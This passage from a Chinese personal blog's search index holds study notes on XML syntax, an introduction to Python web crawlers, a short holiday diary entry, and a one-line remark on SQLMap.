title="高级别"></a>高级别</h3><p>高级别分离了输入页面和显示结果页面，SQLMap没有用武之地~</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xml1</title>
      <link href="/2024/10/10/xml1/"/>
      <url>/2024/10/10/xml1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><table><thead><tr><th>XML</th><th>用来传输和存储数据</th><th>数据内容</th></tr></thead><tbody><tr><td><strong>HTML</strong></td><td><strong>用来显示数据</strong></td><td><strong>数据外观</strong></td></tr></tbody></table><h2 id="关于xml"><a href="#关于xml" class="headerlink" title="关于xml"></a>关于xml</h2><ul><li><h4 id="XML-不会做任何事情。XML-被设计用来结构化、存储以及传输信息。"><a href="#XML-不会做任何事情。XML-被设计用来结构化、存储以及传输信息。" class="headerlink" title="XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。"></a>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</h4></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上面的这条便签具有自我描述性。它包含了发送者和接受者的信息，同时拥有标题以及消息主体。</span><br><span class="line"></span><br><span class="line">但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</span><br></pre></td></tr></table></figure><ul><li><h4 id="XML-语言没有预定义的标签。"><a href="#XML-语言没有预定义的标签。" class="headerlink" title="XML 语言没有预定义的标签。"></a>XML 语言没有预定义的标签。</h4></li></ul><p>可以通过xml发明自己的标签</p><ul><li><h4 id="XML-是独立于软件和硬件的信息传输工具。"><a href="#XML-是独立于软件和硬件的信息传输工具。" class="headerlink" title="XML 是独立于软件和硬件的信息传输工具。"></a><strong>XML 是独立于软件和硬件的信息传输工具。</strong></h4></li></ul><hr><h2 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h2><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML 声明。它定义 XML 的版本（1.0）和所使用的编码（utf-8）--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--子元素--&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--根元素的结尾--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="XML-文档形成一种树结构"><a href="#XML-文档形成一种树结构" class="headerlink" title="XML 文档形成一种树结构"></a>XML 文档形成一种树结构</h4><p>XML 文档必须包含<strong>根元素</strong>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>所有的元素都可以有子元素。</p><p>所有的元素都可以有文本内容和属性（类似 HTML 中）。</p><h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p><img src="/Gopic/xml1.jpg" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;CHILDREN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><ul><li><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4></li></ul><p>XML 声明文件的可选部分，如果存在需要放在文档的第一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="根元素"><a href="#根元素" class="headerlink" title="根元素"></a>根元素</h4></li></ul><p>XML 必须包含根元素，它是所有其他元素的父元素</p><p>XML文档由元素构成，每个元素包括开始标签、结束标签和元素内容。</p><ul><li><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4></li></ul><p>元素可以包含属性，属性提供有关元素的附加信息。</p><p>属性位于开始标签中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">elementName</span> <span class="attr">attribute</span>=<span class="string">&quot;value&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">元素名</span> <span class="attr">属性名1</span>=<span class="string">&quot;属性值1&quot;</span> <span class="attr">属性名2</span>=<span class="string">&quot;属性值2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="单标签"><a href="#单标签" class="headerlink" title="单标签"></a>单标签</h4></li></ul><p>所有的 XML 元素一般都有一个关闭标签，但也允许单标签的使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">elementName</span> <span class="attr">attribute</span>=<span class="string">&quot;value&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>单标签是指在一个标签中同时包含了开始和结束标签，形式类似于 HTML 中的空元素标签。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1.使用空元素标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exampleTag</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2.使用开始和结束标签，但是不包含任何内容： --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exampleTag</span>&gt;</span><span class="tag">&lt;/<span class="name">exampleTag</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h4></li></ul><p>在 XML 中，一些字符拥有特殊的意义。如果您把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生 XML 错误，为了避免这个错误，请用<strong>实体引用</strong>来代替 特殊字符：<br><img src="/Gopic/xml2.jpg" alt="image"></p><ul><li><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4></li></ul><p>在 XML 中，文档中的空格不会被删减：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>xx       xxx<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><p>title的内容读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx       xxx</span><br></pre></td></tr></table></figure><ul><li><h4 id="XML以LF来存储新行"><a href="#XML以LF来存储新行" class="headerlink" title="XML以LF来存储新行"></a>XML以LF来存储新行</h4></li><li><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4></li></ul><ol><li>XML 标签对大小写敏感，必须使用相同的大小写来编写打开标签和关闭标签</li><li>XML必须<strong>正确嵌套</strong></li><li>XML属性值必须加引号</li></ol><hr><h2 id="XML元素"><a href="#XML元素" class="headerlink" title="XML元素"></a>XML元素</h2><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</p><p>一个元素可以包含：</p><ul><li>其他元素</li><li>文本</li><li>属性</li><li>或混合以上所有…</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;CHILDREN&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的实例中，<bookstore> 和 <book> 都有 <strong>元素内容</strong>，因为他们包含其他元素。<book> 元素也有<strong>属性</strong>(category&#x3D;”CHILDREN”)。title、author、year 和 price有<strong>文本内容</strong>，因为他们包含文本。</p><h4 id="XML-命名规则"><a href="#XML-命名规则" class="headerlink" title="XML 命名规则"></a>XML 命名规则</h4><p>XML 元素必须遵循以下命名规则：</p><ul><li>名称可以包含字母、数字以及其他的字符</li><li>名称不能以数字或者标点符号开始</li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始</li><li>名称不能包含空格</li></ul><p>可使用任何名称，没有保留的字词。</p><h4 id="XML-元素是可扩展的"><a href="#XML-元素是可扩展的" class="headerlink" title="XML 元素是可扩展的"></a>XML 元素是可扩展的</h4><p>XML 的优势之一，就是可以在不中断应用程序的情况下进行扩展。</p><hr><h2 id="XML属性"><a href="#XML属性" class="headerlink" title="XML属性"></a>XML属性</h2><p>属性（Attribute）提供有关元素的额外信息。</p><p>属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">file</span> <span class="attr">type</span>=<span class="string">&quot;gif&quot;</span>&gt;</span>computer.gif<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="XML-元素-vs-属性"><a href="#XML-元素-vs-属性" class="headerlink" title="XML  元素 vs 属性"></a>XML  <strong>元素</strong> vs <strong>属性</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sex</span>&gt;</span>female<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在第一个实例中，sex 是一个属性。在第二个实例中，sex 是一个元素。这两个实例都提供相同的信息。</p><p>没有什么规矩可以告诉我们什么时候该使用属性，而什么时候该使用元素。在 HTML 中，属性用起来很便利，<strong>但是在 XML 中，您应该尽量避免使用属性</strong>。如果信息感觉起来很像数据，那么请使用元素吧。</p><p>因使用属性而引起的一些问题：</p><ul><li>属性不能包含多个值（元素可以）</li><li>属性不能包含树结构（元素可以）</li><li>属性不容易扩展（为未来的变化）</li></ul><p><strong>属性难以阅读和维护。请尽量使用元素来描述数据，而仅仅使用属性来提供与数据无关的信息。</strong></p><p>第一个实例中使用了 date 属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">date</span>=<span class="string">&quot;10/01/2008&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二个实例中使用了 date 元素：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">date</span>&gt;</span>10/01/2008<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第三个实例中使用了扩展的 date 元素：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">date</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">day</span>&gt;</span>10<span class="tag">&lt;/<span class="name">day</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">month</span>&gt;</span>01<span class="tag">&lt;/<span class="name">month</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2008<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>xml<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>tiantian<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>world<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="针对元数据的-XML-属性"><a href="#针对元数据的-XML-属性" class="headerlink" title="针对元数据的 XML 属性"></a>针对元数据的 XML 属性</h4><p>有时候会向元素分配 ID 引用。这些 ID 索引可用于标识 XML 元素，它起作用的方式与 HTML 中 id 属性是一样的。这个实例向我们演示了这种情况：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">messages</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;501&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;502&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Re: Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>I will not<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">messages</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的 id 属性仅仅是一个标识符，用于标识不同的便签。它并不是便签数据的组成部分。</p><p>在此我们极力向您传递的理念是：元数据（有关数据的数据）应当存储为属性，而数据本身应当存储为元素。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲话时间2</title>
      <link href="/2024/10/08/%E9%97%B2%E8%AF%9D%E6%97%B6%E9%97%B42/"/>
      <url>/2024/10/08/%E9%97%B2%E8%AF%9D%E6%97%B6%E9%97%B42/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>10月8号，刚过完国庆假期。<br>这个假期玩的还是可以的，感觉自己在家根本呆不了，基本上每天都出门活动，据我老妈说，因为我在家就躺床上玩手机，所以要拉我出去玩。但是这也太频繁了，每次出门要么去逛街，要么就citywalk，这次去了落雁景区，风景还是不错，就是拍照的时候一直飘小雨，拍完照又跟我哥玩了会无人机（我发现只要我两都有空，那是甭想当宅女了，每次都被我哥拉出去玩无人机），主要路途也远，中途也没午休啥的，回到家里沾上床就睡了。<br>顺便，现在我也21岁了。<br>现在在网上看到股票上涨什么的，虽然很羡慕，但又想自己没啥钱，而且偏财运也不好，还是老老实实上班吧，这种东西不适合我。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 茶水间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XPath</title>
      <link href="/2024/10/08/XPath/"/>
      <url>/2024/10/08/XPath/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫</title>
      <link href="/2024/10/08/%E7%88%AC%E8%99%AB/"/>
      <url>/2024/10/08/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h3 id="爬虫：一段自动抓取互联网信息的程序，从互联网上抓取对于我们有价值的信息。"><a href="#爬虫：一段自动抓取互联网信息的程序，从互联网上抓取对于我们有价值的信息。" class="headerlink" title="爬虫：一段自动抓取互联网信息的程序，从互联网上抓取对于我们有价值的信息。"></a>爬虫：一段自动抓取互联网信息的程序，从互联网上抓取对于我们有价值的信息。</h3><h3 id="架构：调度器、URL管理器、网页下载器、网页解析器、应用程序（爬取的有价值数据）"><a href="#架构：调度器、URL管理器、网页下载器、网页解析器、应用程序（爬取的有价值数据）" class="headerlink" title="架构：调度器、URL管理器、网页下载器、网页解析器、应用程序（爬取的有价值数据）"></a>架构：调度器、URL管理器、网页下载器、网页解析器、应用程序（爬取的有价值数据）</h3><p>​<strong>调度器</strong>：相当于一台电脑的CPU，主要负责调度URL管理器、下载器、解析器之间的协调工作。</p><p>​<strong>URL管理器</strong>：包括待爬取的URL地址和已爬取的URL地址，防止重复抓取URL和循环抓取URL，实现URL管理器主要用三种方式，通过内存、数据库、缓存数据库来实现。<br>​<strong>网页下载器</strong>：通过传入一个URL地址来下载网页，将网页转换成一个字符串，网页下载器有urllib2（Python官方基础模块）包括需要登录、代理、和cookie，requests(第三方包)<br>​<strong>网页解析器</strong>：将一个网页字符串进行解析，可以按照我们的要求来提取出我们有用的信息，也可以根据DOM树的解析方式来解析。网页解析器有正则表达式（直观，将网页转成字符串通过模糊匹配的方式来提取有价值的信息，当文档比较复杂的时候，该方法提取数据的时候就会非常的困难）、html.parser（Python自带的）、beautifulsoup（第三方插件，可以使用Python自带的html.parser进行解析，也可以使用lxml进行解析，相对于其他几种来说要强大一些）、lxml（第三方插件，可以解析 xml 和 HTML），html.parser 和 beautifulsoup 以及 lxml 都是以 DOM 树的方式进行解析的。<br>​<strong>应用程序</strong>：就是从网页中提取的有用数据组成的一个应用</p><p><img src="/PyPic/1.jpg" alt="image-20241008095931929"></p><h2 id="urllib2"><a href="#urllib2" class="headerlink" title="urllib2"></a>urllib2</h2><p><code>urllib2</code> 是 Python 2 中的一个模块，用于访问网络资源。它提供了许多用于处理 HTTP 请求的方法，包括发送请求、处理重定向、设置代理等。</p><p>在 Python 3 中，<code>urllib2</code> 模块已经被拆分成几个子模块，分别位于 <code>urllib</code> 包中：</p><ul><li><code>urllib.request</code>：用于打开和读取 URL。</li><li><code>urllib.error</code>：包含 URL 处理过程中可能抛出的异常。</li><li><code>urllib.parse</code>：用于解析 URL。</li></ul><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 